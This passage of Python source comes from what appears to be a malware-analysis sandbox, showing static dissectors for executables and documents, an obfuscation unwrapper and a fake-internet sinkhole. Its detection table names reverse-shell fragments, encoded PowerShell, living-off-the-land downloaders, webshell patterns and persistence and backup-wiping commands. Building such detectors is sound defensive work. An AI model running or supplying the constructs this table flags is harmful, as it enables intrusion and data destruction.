    # -- program headers: interpreter presence, RWX segments ----------------
    has_interp = False
    for i in range(min(e_phnum, 128)):
        p = e_phoff + i * ph_size
        p_type = u(p, 4)
        if is64:
            p_flags, p_offset, p_filesz = u(p + 4, 4), u(p + 8, 8), u(p + 32, 8)
        else:
            p_offset, p_filesz, p_flags = u(p + 4, 4), u(p + 16, 4), u(p + 24, 4)
        if p_type == 3:
            has_interp = True
        if p_type == 1 and (p_flags & 0x7) == 0x7:
            tr.add("capability", "rwx", "PT_LOAD segment %d is RWX" % i,
                   value="seg%d" % i)
        if p_type == 1 and p_filesz > 0x10000 and p_offset + p_filesz <= len(data):
            if shannon_entropy(data[p_offset:p_offset + 65536]) >= 7.4:
                tr.add("meta", "high_entropy_code",
                       "PT_LOAD segment %d is high-entropy" % i)
    if not has_interp and e_type == 2:
        tr.add("meta", "static_linked", "no PT_INTERP: statically linked")

    # -- sections ----------------------------------------------------------
    shstr_base = None
    if e_shstrndx and e_shoff:
        so = e_shoff + e_shstrndx * sh_size
        shstr_base = u(so + 24, 8) if is64 else u(so + 16, 4)
    seen = set()
    dynstr = (0, 0)
    for i in range(min(e_shnum, 128)):
        so = e_shoff + i * sh_size
        if so + sh_size > len(data):
            break
        name = _cstr(data, shstr_base + u(so, 4), 64) if shstr_base else ""
        sh_offset = u(so + 24, 8) if is64 else u(so + 16, 4)
        sh_sz = u(so + 32, 8) if is64 else u(so + 20, 4)
        seen.add(name)
        if name == ".dynstr":
            dynstr = (sh_offset, sh_sz)
    if not e_shnum or not e_shoff:
        tr.add("meta", "no_section_table",
               "section headers absent -- typical of a packed ELF")
    elif ".symtab" not in seen:
        tr.add("meta", "stripped", "no .symtab")

    # .dynstr carries DT_NEEDED library names and imported symbol names in one
    # NUL-separated blob. Walking it gets both without a .dynsym + .dynamic
    # traversal, and it still works when the section table is partly mangled.
    off, sz = dynstr
    if sz and off + sz <= len(data):
        for tok in data[off:off + min(sz, 262144)].split(b"\x00"):
            if not (2 <= len(tok) <= 96):
                continue
            s = tok.decode("ascii", "ignore")
            if s.startswith("lib") and ".so" in s:
                tr.add("meta", "elf_needs", "links against %s" % s, value=s)
            else:
                _note_capability(tr, s, origin="dynsym")


# Office/PDF/script indicators. Each entry is (needle, observation kind, token,
# weight-bearing description). Matched case-folded against the decoded body.
DOC_INDICATORS: List[Tuple[bytes, str, str, str]] = [
    (b"ddeauto",              "capability", "dde_exec",   "DDEAUTO field executes a command"),
    (b"dde ",                 "capability", "dde_exec",   "DDE field"),
    (b"eqnolefilehdr",        "evade",      "exploit_eqn", "Equation Editor object (CVE-2017-11882 shape)"),
    (b"/javascript",          "capability", "pdf_js",     "PDF JavaScript"),
    (b"/openaction",          "capability", "pdf_autorun", "PDF action on open"),
    (b"/aa",                  "capability", "pdf_autorun", "PDF additional action"),
    (b"/launch",              "capability", "exec",       "PDF /Launch action"),
    (b"/embeddedfile",        "capability", "pdf_embed",  "PDF embedded file"),
    (b"/richmedia",           "capability", "pdf_embed",  "PDF RichMedia object"),
    (b"/xfa",                 "capability", "pdf_js",     "PDF XFA form"),
    (b"auto_open",            "capability", "macro_auto", "macro runs on open (Auto_Open)"),
    (b"autoopen",             "capability", "macro_auto", "macro runs on open (AutoOpen)"),
    (b"document_open",        "capability", "macro_auto", "macro runs on open (Document_Open)"),
    (b"workbook_open",        "capability", "macro_auto", "macro runs on open (Workbook_Open)"),
    (b"auto_close",           "capability", "macro_auto", "macro runs on close"),
    (b"shell(",               "capability", "exec",       "VBA Shell() call"),
    (b"wscript.shell",        "capability", "exec",       "WScript.Shell"),
    (b"createobject",         "capability", "dyn_resolve", "late-bound object creation"),
    (b"getobject",            "capability", "dyn_resolve", "late-bound object lookup"),
    (b"xmlhttp",              "capability", "net_http",   "XMLHTTP client"),
    (b"winhttprequest",       "capability", "net_http",   "WinHTTP client"),
    (b"adodb.stream",         "capability", "download",   "ADODB.Stream write-to-disk"),
    (b"savetofile",           "capability", "download",   "stream saved to disk"),
    (b"powershell",           "capability", "exec",       "PowerShell invocation"),
    (b"-encodedcommand",      "capability", "encoded_command", "base64-encoded PowerShell command line"),
    (b"-enc ",                "capability", "encoded_command", "base64-encoded PowerShell command line"),
    (b"-e jab",               "capability", "encoded_command", "base64-encoded PowerShell command line"),
    (b"frombase64string",     "capability", "obfuscation", "base64 decode at runtime"),
    (b"invoke-expression",    "capability", "exec",       "Invoke-Expression"),
    (b"iex(",                 "capability", "exec",       "Invoke-Expression (alias)"),
    (b"iex (",                "capability", "exec",       "Invoke-Expression (alias)"),
    (b"|iex",                 "capability", "exec",       "piped into Invoke-Expression"),
    (b"| iex",                "capability", "exec",       "piped into Invoke-Expression"),
    (b"net.webclient",        "capability", "download",   "WebClient instantiation"),
    (b"invoke-webrequest",    "capability", "download",   "Invoke-WebRequest"),
    (b"invoke-restmethod",    "capability", "download",   "Invoke-RestMethod"),
    (b"bitstransfer",         "capability", "download",   "BITS transfer"),
    (b"certutil -urlcache",   "capability", "lolbin_download", "certutil used as a downloader"),
    (b"certutil.exe -urlcache", "capability", "lolbin_download", "certutil used as a downloader"),
    (b"certutil -decode",     "capability", "obfuscation", "certutil used as a decoder"),
    (b"bitsadmin /transfer",  "capability", "lolbin_download", "bitsadmin used as a downloader"),
    (b"mshta http",           "capability", "remote_exec", "mshta executing a remote URL"),
    (b"mshta javascript:",    "capability", "remote_exec", "mshta executing inline script"),
    (b"mshta vbscript:",      "capability", "remote_exec", "mshta executing inline script"),
    (b"rundll32 javascript:", "capability", "remote_exec", "rundll32 executing inline script"),
    (b"regsvr32 /i:http",     "capability", "remote_exec", "regsvr32 fetching a remote scriptlet"),
    (b"/i:http",              "capability", "remote_exec", "scriptlet fetched from a URL"),
    (b"wmic process call create", "capability", "remote_exec", "process creation via WMI"),
    (b"mshta ",               "capability", "exec",       "mshta script execution"),
    (b"rundll32 ",            "capability", "exec",       "rundll32 execution"),
    (b"regsvr32 /i:",         "capability", "exec",       "regsvr32 scriptlet execution"),
    (b"downloadstring",       "capability", "download",   "WebClient.DownloadString"),
    (b"downloadfile",         "capability", "download",   "WebClient.DownloadFile"),
    (b"start-process",        "capability", "exec",       "Start-Process"),
    (b"reflection.assembly",  "capability", "dyn_resolve", "in-memory assembly load"),
    (b"[char]",               "capability", "obfuscation", "character-array string building"),
    (b"eval(",                "capability", "exec",       "eval()"),
    (b"eval(base64_decode",   "capability", "webshell",   "PHP webshell eval/base64 pair"),
    (b"assert(",              "capability", "exec",       "assert() as an eval alias"),
    (b"$_post[",              "capability", "webshell",   "request-driven PHP execution"),
    (b"$_get[",               "capability", "webshell",   "request-driven PHP execution"),
    (b"unescape(",            "capability", "obfuscation", "unescape() string building"),
    (b"activexobject",        "capability", "dyn_resolve", "ActiveXObject"),
    (b"/dev/tcp/",            "capability", "revshell",   "bash /dev/tcp reverse shell"),
    (b"bash -i",              "capability", "revshell",   "interactive shell redirection"),
    (b"nc -e",                "capability", "revshell",   "netcat command execution"),
    (b"curl ",                "capability", "download",   "curl fetch"),
    (b"wget ",                "capability", "download",   "wget fetch"),
    (b"chmod +x",             "capability", "exec",       "makes a file executable"),
    (b"base64 -d",            "capability", "obfuscation", "base64 decode in shell"),
    (b"crontab",              "persist",    "persist_cron", "cron persistence"),
    (b"schtasks /create",     "persist",    "persist_task", "scheduled-task persistence"),
    (b"currentversion\\run",  "persist",    "persist_reg", "Run-key persistence"),
    (b"/etc/rc.local",        "persist",    "persist_init", "init-script persistence"),
    (b".ssh/authorized_keys", "persist",    "persist_ssh", "SSH key persistence"),
    (b"vssadmin delete",      "crypto",     "wipe_shadow", "deletes volume shadow copies"),
    (b"bcdedit /set",         "crypto",     "wipe_recovery", "disables recovery"),
    (b"wbadmin delete",       "crypto",     "wipe_backup", "deletes backups"),
    (b"eicar-standard-antivirus-test-file", "capability", "eicar",
     "the EICAR test string"),
]


_B64_RUN = re.compile(rb"[A-Za-z0-9+/]{40,}={0,2}")


def unwrap_layers(data: bytes, tr: BehaviorTrace, depth: int = 2) -> bytes:
    """Peel obfuscation layers and return the accumulated decoded material.

    Two layers only, and only for encodings that are cheap and unambiguous:
    base64 runs, and UTF-16LE (which is what PowerShell -EncodedCommand and
    half of all VBS droppers actually use). This matters because every string
    indicator below is useless against a payload that arrives base64-wrapped,
    and one decode step recovers the overwhelming majority of real samples.
    """
    out = bytearray()
    layer = data
    for level in range(depth):
        found = bytearray()
        # UTF-16LE: a run of ASCII interleaved with NULs decodes to plain text.
        if layer.count(b"\x00") > len(layer) // 4 and len(layer) > 16:
            try:
                dec = layer.decode("utf-16-le", "ignore").encode("utf-8", "ignore")
                if dec and sum(32 <= c < 127 for c in dec) > len(dec) * 0.8:
                    found += dec
                    tr.add("capability", "obfuscation",
                           "UTF-16LE encoded body (layer %d)" % (level + 1))
            except Exception:
                pass
        for m in _B64_RUN.finditer(layer):
            tok = m.group(0)
            if len(tok) > 1 << 20:
                continue
            try:
                dec = base64.b64decode(tok + b"=" * (-len(tok) % 4), validate=False)
            except (binascii.Error, ValueError):
                continue
            if len(dec) < 16:
                continue
            printable = sum(32 <= c < 127 or c in (9, 10, 13) for c in dec)
            emb = detect_file_type(dec[:16])
            # Keep a decode only if it looks like text or like a real object --
            # otherwise every high-entropy blob "decodes" into noise.
            if printable > len(dec) * 0.75 or emb:
                found += b"\n" + dec
                if emb:
                    tr.add("meta", "embedded_executable",
                           "base64 layer %d decodes to a %s object" % (level + 1, emb),
                           value=emb)
                else:
                    tr.add("capability", "obfuscation",
                           "base64-encoded payload (layer %d)" % (level + 1))
            if len(found) > 4 << 20:
                break
        if not found:
            break
        out += found
        layer = bytes(found)
    return bytes(out)


# How far past a matched indicator to reach for its argument, and the bytes
# that end the reach. A command line ends at a newline or a quote; running past
# one would splice unrelated content into the pattern.
SIG_CONTEXT = 56
SIG_STOPS = b"\r\n" + bytes([34, 39, 59, 62, 0])      # CR LF " \' ; > NUL
SIG_MIN = 14


def _sig_candidate(body: bytes, at: int, needle_len: int) -> Optional[str]:
    """The matched indicator plus its argument, as a printable snippet."""
    end = at + needle_len
    limit = min(len(body), end + SIG_CONTEXT)
    while end < limit:
        ch = body[end]
        if ch in SIG_STOPS or not (32 <= ch < 127):
            break
        end += 1
    snippet = body[at:end]
    if len(snippet) < SIG_MIN:
        return None
    try:
        text = snippet.decode("ascii")
    except UnicodeError:
        return None
    return text.strip() or None


def sweep_iocs(body: bytes, tr: BehaviorTrace, *, text_like: bool,
               limit: int = 24) -> None:
    """Record network indicators found in `body` as static candidates.

    `text_like` decides whether bare hostnames and dotted quads are collected
    at all. Over compiled or compressed bytes those regexes match fragments of
    anything, so only URLs -- which need a scheme -- are taken from binary
    content. Everything recorded here is a candidate: the assay condemns it
    only if the sample is convicted on other evidence.
    """
    kinds = ("url", "domain", "ip") if text_like else ("url",)
    found = extract_iocs(body[:1 << 20])
    for kind in kinds:
        for v in found.get(kind, [])[:limit]:
            tr.add("net", "static_%s" % kind, "%s found in content" % kind,
                   value=v)


def dissect_indicators(body: bytes, tr: BehaviorTrace, *,
                       origin: str = "body") -> None:
    """Match the document/script indicator table against a decoded body.

    Each hit records the capability, and -- for indicators heavy enough to be
    worth enforcing on -- a signature candidate carrying the argument that
    followed it. The candidate is what _assay_signatures prefers, because
    "powershell -enc <blob>" is a rule and "-enc" is a false positive.
    """
    low = body.lower()
    for needle, kind, token, desc in DOC_INDICATORS:
        at = low.find(needle)
        if at < 0:
            continue
        tr.add(kind, token, "%s: %s" % (origin, desc),
               value=needle.decode("ascii", "replace").strip())
        if TOKEN_WEIGHT.get(token, 0) >= 40:
            cand = _sig_candidate(body, at, len(needle))
            if cand:
                tr.add("meta", "sig_candidate",
                       "%s: distinctive construct near %s"
                       % (origin, token), value=cand)


def dissect_ooxml(data: bytes, tr: BehaviorTrace) -> None:
    """Inspect a ZIP/OOXML container: macros, external targets, nested objects."""
    import io
    import zipfile
    try:
        zf = zipfile.ZipFile(io.BytesIO(data))
        names = zf.namelist()
    except Exception as e:
        tr.add("meta", "zip_malformed", "cannot open container: %s" % e)
        return
    tr.add("meta", "container", "zip with %d entr%s" %
           (len(names), "y" if len(names) == 1 else "ies"), value=str(len(names)))
    lower = [n.lower() for n in names]
    if any(n.endswith("vbaproject.bin") for n in lower):
        tr.add("capability", "macro", "contains a VBA project (macros)")
    if any(n.endswith(".xlm") or "macrosheet" in n for n in lower):
        tr.add("capability", "macro", "contains an Excel 4.0 macro sheet")
    if any(n.startswith("word/") for n in lower):
        tr.add("meta", "doc_kind", "wordprocessing document", value="docx")
    elif any(n.startswith("xl/") for n in lower):
        tr.add("meta", "doc_kind", "spreadsheet", value="xlsx")
    elif any(n.startswith("ppt/") for n in lower):
        tr.add("meta", "doc_kind", "presentation", value="pptx")
    elif any(n == "androidmanifest.xml" for n in lower):
        tr.add("meta", "doc_kind", "android package", value="apk")

    # Read the parts most likely to carry the payload. Bounded: a zip bomb
    # must not be able to make us allocate, so each part is capped and the
    # total decompressed budget is fixed.
    budget = 8 << 20
    for name in names[:512]:
        low = name.lower()
        interesting = (low.endswith((".xml", ".rels", ".bin", ".vbs", ".js",
                                     ".ps1", ".bat", ".cmd", ".sh", ".txt"))
                       or "macro" in low or "vba" in low)
        try:
            info = zf.getinfo(name)
        except KeyError:
            continue
        if info.file_size > budget:
            tr.add("meta", "zip_oversized",
                   "%s expands to %d bytes; not read" % (name, info.file_size))
            continue
        emb = None
        if not interesting:
            # Still worth a magic check: an .exe inside a .docx is the finding.
            try:
                with zf.open(name) as fh:
                    emb = detect_file_type(fh.read(16))
            except Exception:
                emb = None
            if emb in ("pe", "elf", "macho"):
                tr.add("meta", "embedded_executable",
                       "container member %s is a %s object" % (name, emb), value=emb)
            continue
        try:
            with zf.open(name) as fh:
                part = fh.read(min(info.file_size, budget))
        except Exception:
            continue
        budget -= len(part)
        dissect_indicators(part, tr, origin=name)
        # The decompressed member is where a macro's C2 URL actually lives.
        # Bare hostnames are only taken from members that are genuinely text;
        # vbaProject.bin is a nested OLE container, so it gets URLs only.
        sweep_iocs(part, tr,
                   text_like=low.endswith((".xml", ".rels", ".txt", ".js",
                                           ".vbs", ".ps1", ".bat", ".cmd",
                                           ".sh", ".htm", ".html")))
        # An external relationship target is remote template / remote payload
        # injection: the document itself is clean and fetches the malicious part.
        if low.endswith(".rels") and b"targetmode=\"external\"" in part.lower():
            for m in re.finditer(rb'target="([^"]{4,2048})"', part, re.I):
                url = m.group(1).decode("ascii", "ignore")
                if url.lower().startswith(("http://", "https://", "\\\\", "mhtml:")):
                    tr.add("net", "remote_template",
                           "%s references an external target" % name, value=url)
        if budget <= 0:
            break
    extra = unwrap_layers(data[:1 << 20], tr, depth=1)
    if extra:
        dissect_indicators(extra, tr, origin="decoded")
        sweep_iocs(extra, tr, text_like=True)


def dissect_ole(data: bytes, tr: BehaviorTrace) -> None:
    """Legacy OLE compound file (.doc/.xls/.ppt): macro streams and objects."""
    tr.add("meta", "container", "OLE compound document", value="ole")
    low = data.lower()
    for needle, what, desc in (
            (b"_vba_project", "macro", "VBA project stream present"),
            (b"\x00m\x00a\x00c\x00r\x00o", "macro", "Macros storage present"),
            (b"macros", "macro", "Macros storage present"),
            (b"ole10native", "embedded_object", "packaged embedded object"),
            (b"\\objupdate", "embedded_object", "auto-updating embedded object")):
        if needle in low:
            kind = "capability" if what == "macro" else "meta"
            tr.add(kind, what, desc)
    dissect_indicators(data, tr, origin="ole")
    # An OLE document is binary, but its macro streams hold URLs as plain text.
    sweep_iocs(data, tr, text_like=False)
    extra = unwrap_layers(data[:1 << 20], tr, depth=1)
    if extra:
        dissect_indicators(extra, tr, origin="decoded")
        sweep_iocs(extra, tr, text_like=True)


def dissect_pdf(data: bytes, tr: BehaviorTrace) -> None:
    """PDF: action objects, embedded content, and object-stream obfuscation."""
    low = data.lower()
    tr.add("meta", "doc_kind", "PDF document", value="pdf")
    dissect_indicators(data, tr, origin="pdf")
    nobj = low.count(b" obj")
    nstm = low.count(b"/objstm")
    if nstm:
        tr.add("capability", "obfuscation",
               "%d object stream(s) hide objects from naive parsers" % nstm)
    if nobj and low.count(b"/js") + low.count(b"/javascript") == 0 \
            and b"/openaction" not in low and nobj < 8:
        tr.add("meta", "pdf_simple", "%d objects, no scripting or actions" % nobj)
    for m in re.finditer(rb"/URI\s*\(([^)]{4,2048})\)", data, re.I):
        tr.add("net", "pdf_uri", "PDF link target",
               value=m.group(1).decode("ascii", "ignore"))


def dissect_script(data: bytes, tr: BehaviorTrace, ftype: Optional[str]) -> None:
    """Text-ish sample: indicators on the raw body and on decoded layers."""
    tr.add("meta", "doc_kind", "script or text object", value=ftype or "text")
    dissect_indicators(data, tr, origin="script")
    decoded = unwrap_layers(data, tr, depth=2)
    if decoded:
        dissect_indicators(decoded, tr, origin="decoded")
        # A base64 layer is exactly where a dropper puts its real C2 address.
        sweep_iocs(decoded, tr, text_like=True)
        emb = detect_file_type(decoded[:16])
        if emb in ("pe", "elf", "macho"):
            tr.add("meta", "embedded_executable",
                   "decodes to a %s object" % emb, value=emb)
    # A very long single line is how minified droppers and one-liner loaders
    # arrive; ordinary scripts wrap.
    longest = max((len(x) for x in data.split(b"\n")[:4096]), default=0)
    if longest > 4000:
        tr.add("capability", "obfuscation",
               "single line of %d bytes" % longest, value=str(longest))


def dissect(data: bytes, tr: BehaviorTrace) -> None:
    """Full static pass. Sets tr.file_type and emits every static observation."""
    ftype = detect_file_type(data)
    tr.file_type = ftype or tr.file_type
    tr.size = len(data)
    ent = shannon_entropy(data[:65536])
    tr.add("meta", "size", "%d bytes" % len(data), value=str(len(data)))
    tr.add("meta", "entropy", "%.3f over the first 64 KiB" % ent,
           value="%.3f" % ent)
    if ent >= 7.8 and len(data) > 4096:
        tr.add("meta", "very_high_entropy",
               "entropy %.2f: encrypted, compressed or packed" % ent)

    if ftype == "pe":
        dissect_pe(data, tr)
        dissect_indicators(data, tr, origin="pe")
        extra = unwrap_layers(data, tr, depth=1)
        if extra:
            dissect_indicators(extra, tr, origin="decoded")
    elif ftype == "elf":
        dissect_elf(data, tr)
        dissect_indicators(data, tr, origin="elf")
    elif ftype == "macho":
        tr.add("meta", "macho", "Mach-O object", value="macho")
        dissect_indicators(data, tr, origin="macho")
    elif ftype == "zip":
        dissect_ooxml(data, tr)
    elif ftype == "ole":
        dissect_ole(data, tr)
    elif ftype == "pdf":
        dissect_pdf(data, tr)
    else:
        dissect_script(data, tr, ftype)

    # Network indicators present in the bytes themselves, recorded as candidates
    # rather than findings -- a string is not proof of contact, so the assay
    # condemns these only once the sample is convicted on other grounds.
    #
    # Bare hostnames and IPs are swept ONLY out of text-shaped objects. Run over
    # a compiled binary or a zip, the domain and dotted-quad regexes match
    # fragments of anything -- an import table reads as a list of domains and a
    # zip's central directory as another -- so the sweep is limited to URLs
    # there, which need a scheme and survive the noise.
    sweep_iocs(data, tr,
               text_like=ftype in (None, "script", "php", "html_js", "pdf",
                                   "text"))


# ===========================================================================
# Chambers
# ===========================================================================
@dataclass
class ChamberStatus:
    """Whether a chamber can run here, and if not, precisely why not."""
    name: str
    fidelity: int
    available: bool
    reason: str = ""
    executes: bool = False

    def line(self) -> str:
        return "%-14s fidelity=%d %-13s %s" % (
            self.name, self.fidelity,
            "AVAILABLE" if self.available else "unavailable",
            self.reason)


class Chamber:
    """A place a sample can be subjected to analysis."""

    name = "abstract"
    fidelity = -1
    executes = False

    def status(self) -> ChamberStatus:
        raise NotImplementedError

    def handles(self, ftype: Optional[str], data: bytes) -> bool:
        """Can this chamber meaningfully analyse this object?"""
        return True

    def run(self, sha256: str, data: bytes, meta: dict, *,
            timeout: int = DEFAULT_TIMEOUT) -> BehaviorTrace:
        raise NotImplementedError


class StaticChamber(Chamber):
    """Fidelity 0: dissect the object's format. Never executes anything."""

    name = "static"
    fidelity = 0
    executes = False

    def status(self) -> ChamberStatus:
        return ChamberStatus(self.name, self.fidelity, True,
                             "format dissection, always available")

    def run(self, sha256: str, data: bytes, meta: dict, *,
            timeout: int = DEFAULT_TIMEOUT) -> BehaviorTrace:
        t0 = time.time()
        tr = BehaviorTrace(sha256=sha256, chamber=self.name,
                           fidelity=self.fidelity, size=len(data))
        try:
            dissect(data, tr)
        except Exception as e:                       # a dissector bug is not a verdict
            logger.exception("static dissection failed for %s", sha256[:12])
            tr.errors.append("dissect: %s" % e)
            tr.add("error", "dissect_failed", str(e)[:200])
        tr.duration = time.time() - t0
        return tr


# ===========================================================================
# Sinkhole -- the fake internet a detonating sample is allowed to talk to.
#
# A sample that cannot resolve or connect anywhere tells us very little: it
# fails early and its interesting behaviour never happens. A sample given the
# REAL internet tells us plenty but attacks third parties from our address and
# lets its operator see our analysis. The answer both commercial and open
# sandboxes use is a fake internet: resolve every name to us, accept every
# connection, and answer plausibly.
#
# What we get out of it that a trace alone cannot give: the DNS names (not just
# IPs), the full HTTP request line, Host and User-Agent, and the TLS SNI --
# which are exactly the artefacts that make a good signature.
# ===========================================================================
class Sinkhole:
    """A DNS + HTTP + TLS-SNI capture service on loopback or a veth address."""

    def __init__(self, bind: str = "127.0.0.1", sink_ip: str = "10.99.99.99",
                 *, dns_port: int = 0, http_port: int = 0, tls_port: int = 0):
        self.bind = bind
        self.sink_ip = sink_ip
        self.want = {"dns": dns_port, "http": http_port, "tls": tls_port}
        self.ports: Dict[str, int] = {}
        self.events: List[Dict] = []
        self._socks: List[socket.socket] = []
        self._threads: List[threading.Thread] = []
        self._stop = threading.Event()
        self._lock = threading.Lock()

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> Dict[str, int]:
        """Bind and serve. Ports requested as 0 are allocated ephemerally.

        A privileged port that cannot be bound is downgraded to an ephemeral one
        rather than failing: the chamber redirects traffic to whatever port we
        actually got, and the selftest needs to run as an unprivileged user.
        """
        self._bind_udp("dns", self._serve_dns)
        self._bind_tcp("http", self._serve_http)
        self._bind_tcp("tls", self._serve_tls)
        return dict(self.ports)

    def stop(self) -> None:
        self._stop.set()
        for s in self._socks:
            try:
                s.close()
            except OSError:
                pass
        for t in self._threads:
            t.join(timeout=2.0)
        self._socks.clear()
        self._threads.clear()

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *exc):
        self.stop()
        return False

    def _bind_udp(self, role: str, handler) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((self.bind, self.want[role]))
        except OSError:
            try:
                s.bind((self.bind, 0))
            except OSError as e:
                logger.warning("sinkhole %s: cannot bind (%s)", role, e)
                s.close()
                return
        s.settimeout(0.5)
        self.ports[role] = s.getsockname()[1]
        self._socks.append(s)
        t = threading.Thread(target=handler, args=(s,), daemon=True,
                             name="sink-%s" % role)
        t.start()
        self._threads.append(t)

    def _bind_tcp(self, role: str, handler) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((self.bind, self.want[role]))
        except OSError:
            try:
                s.bind((self.bind, 0))
            except OSError as e:
                logger.warning("sinkhole %s: cannot bind (%s)", role, e)
                s.close()
                return
        s.listen(16)
        s.settimeout(0.5)
        self.ports[role] = s.getsockname()[1]
        self._socks.append(s)
        t = threading.Thread(target=handler, args=(s,), daemon=True,
                             name="sink-%s" % role)
        t.start()
        self._threads.append(t)

    def _record(self, kind: str, **kw) -> None:
        with self._lock:
            if len(self.events) < 512:
                self.events.append(dict(kw, kind=kind, t=time.time()))

    # -- DNS ---------------------------------------------------------------
    @staticmethod
    def _dns_name(pkt: bytes, off: int) -> Tuple[str, int]:
        """Read a QNAME. Refuses compression pointers: a real query has none,
        and following one in hostile input is how a parser gets looped."""
        labels = []
        for _ in range(64):
            if off >= len(pkt):
                break
            n = pkt[off]
            if n == 0:
                off += 1
                break
            if n & 0xC0:
                return ".".join(labels), off + 2
            labels.append(pkt[off + 1:off + 1 + n].decode("ascii", "replace"))
            off += 1 + n
        return ".".join(labels), off

    def _serve_dns(self, sock: socket.socket) -> None:
        while not self._stop.is_set():
            try:
                pkt, peer = sock.recvfrom(2048)
            except (socket.timeout, OSError):
                continue
            if len(pkt) < 13:
                continue
            try:
                qname, end = self._dns_name(pkt, 12)
                qtype = struct.unpack_from(">H", pkt, end)[0] \
                    if end + 2 <= len(pkt) else 1
                self._record("dns", name=qname, qtype=qtype, peer=peer[0])
                # Answer A/AAAA with the sink address so the sample goes on to
                # connect and reveal its protocol behaviour.
                if qtype in (1, 28):
                    resp = bytearray(pkt[:2])
                    resp += struct.pack(">HHHHH", 0x8180, 1, 1, 0, 0)
                    resp += pkt[12:end + 4]
                    resp += b"\xc0\x0c"                    # NAME -> offset 12
                    if qtype == 1:
                        resp += struct.pack(">HHIH", 1, 1, 60, 4)
                        resp += socket.inet_aton(self.sink_ip)
                    else:
                        resp += struct.pack(">HHIH", 28, 1, 60, 16)
                        resp += b"\x00" * 15 + b"\x01"
                    sock.sendto(bytes(resp), peer)
            except (struct.error, OSError, UnicodeError):
                continue

    # -- HTTP --------------------------------------------------------------
    def _serve_http(self, sock: socket.socket) -> None:
        while not self._stop.is_set():
            try:
                conn, peer = sock.accept()
            except (socket.timeout, OSError):
                continue
            threading.Thread(target=self._http_conn, args=(conn, peer),
                             daemon=True).start()

    def _http_conn(self, conn: socket.socket, peer) -> None:
        eol = b"\x0d\x0a"
        try:
            conn.settimeout(3.0)
            buf = b""
            while len(buf) < 16384 and eol + eol not in buf:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                buf += chunk
            head = buf.split(eol + eol, 1)[0].decode("latin-1", "replace")
            lines = head.split(eol.decode())
            request = lines[0][:512] if lines else ""
            hdrs = {}
            for ln in lines[1:]:
                if ":" in ln:
                    k, v = ln.split(":", 1)
                    hdrs[k.strip().lower()] = v.strip()[:512]
            self._record("http", request=request, host=hdrs.get("host", ""),
                         ua=hdrs.get("user-agent", ""), peer=peer[0],
                         body_len=max(0, len(buf) - len(head) - 4))
            # Answer 200 with a tiny body. A dropper handed a 404 usually gives
            # up; one handed content often proceeds to stage two, which is the
            # behaviour worth observing.
            conn.sendall(b"HTTP/1.1 200 OK" + eol +
                         b"Content-Length: 2" + eol +
                         b"Content-Type: application/octet-stream" + eol +
                         b"Connection: close" + eol + eol + b"ok")
        except OSError:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    # -- TLS ---------------------------------------------------------------
    @staticmethod
    def _sni_of(hello: bytes) -> Optional[str]:
        """Pull server_name out of a TLS ClientHello.

        Bounds-checked at every step: every length field in the record is
        attacker-controlled, and this parser runs on bytes a malware sample
        chose. It returns None rather than raising on anything unexpected.
        """
        try:
            if len(hello) < 45 or hello[0] != 0x16 or hello[5] != 0x01:
                return None
            o = 43                                     # into the ClientHello body
            o += 1 + hello[o]                          # legacy_session_id
            o += 2 + struct.unpack_from(">H", hello, o)[0]      # cipher_suites
            o += 1 + hello[o]                          # compression_methods
            if o + 2 > len(hello):
                return None
            ext_end = o + 2 + struct.unpack_from(">H", hello, o)[0]
            o += 2
            while o + 4 <= min(ext_end, len(hello)):
                etype, elen = struct.unpack_from(">HH", hello, o)
                o += 4
                if etype == 0 and o + 5 <= len(hello):
                    nlen = struct.unpack_from(">H", hello, o + 3)[0]
                    if not nlen:
                        return None
                    return hello[o + 5:o + 5 + nlen].decode("ascii", "replace")
                o += elen
        except (struct.error, IndexError, UnicodeError, ValueError):
            return None
        return None

    def _serve_tls(self, sock: socket.socket) -> None:
        while not self._stop.is_set():
            try:
                conn, peer = sock.accept()
            except (socket.timeout, OSError):
                continue
            try:
                conn.settimeout(3.0)
                hello = conn.recv(4096)
                sni = self._sni_of(hello) if hello else None
                self._record("tls", sni=sni or "", peer=peer[0],
                             bytes_in=len(hello or b""))
                # We have no certificate to offer, so refuse cleanly with a
                # handshake_failure alert. The SNI -- the part worth having --
                # is already captured by the time we answer.
                conn.sendall(b"\x15\x03\x03\x00\x02\x02\x28")
            except OSError:
                pass
            finally:
                try:
                    conn.close()
                except OSError:
                    pass

    # -- results -----------------------------------------------------------
    def into(self, tr: BehaviorTrace) -> int:
        """Fold captured traffic into a trace as LIVE network observations.

        These are the strongest evidence the whole engine produces: a domain
        here was actually resolved by the running sample, not merely present in
        its bytes, so the assay is entitled to condemn it directly.
        """
        with self._lock:
            events = list(self.events)
        for ev in events:
            if ev["kind"] == "dns" and ev.get("name"):
                tr.add("net", "dns_query", "resolved %s" % ev["name"],
                       live=True, value=ev["name"])
            elif ev["kind"] == "http":
                req = ev.get("request", "")
                tr.add("net", "http_request",
                       "%s host=%s ua=%s" % (req, ev.get("host", ""),
                                             ev.get("ua", "")),
                       live=True, value=ev.get("host") or req)
                if ev.get("ua"):
                    tr.add("net", "http_ua", "User-Agent %s" % ev["ua"],
                           live=True, value=ev["ua"])
                if req:
                    parts = req.split(" ")
                    tr.add("net", "http_uri", req, live=True,
                           value=parts[1] if len(parts) > 1 else req)
            elif ev["kind"] == "tls" and ev.get("sni"):
                tr.add("net", "tls_sni", "TLS SNI %s" % ev["sni"],
                       live=True, value=ev["sni"])
        return len(events)


# ===========================================================================
# JailChamber -- fidelity 1: really run it, on this box, watched.
#
# HOW THE ISOLATION WORKS, and what it is not
#   unshare(1) puts the sample in fresh mount, PID and network namespaces with
#   --map-root-user, so we are root INSIDE those namespaces without being root
#   outside. Two things follow, and they are the whole reason this design works
#   without privileges:
#     * we can bring up loopback and bind port 53/80/443 in the new netns, so
#       the fake internet runs INSIDE the jail on 127.0.0.1 and the sample can
#       reach it -- while the jail has no route to anything real;
#     * we can bind-mount a resolv.conf over /etc/resolv.conf in the new mount
#       namespace, so name resolution goes to our sinkhole, without touching
#       the host's file.
#
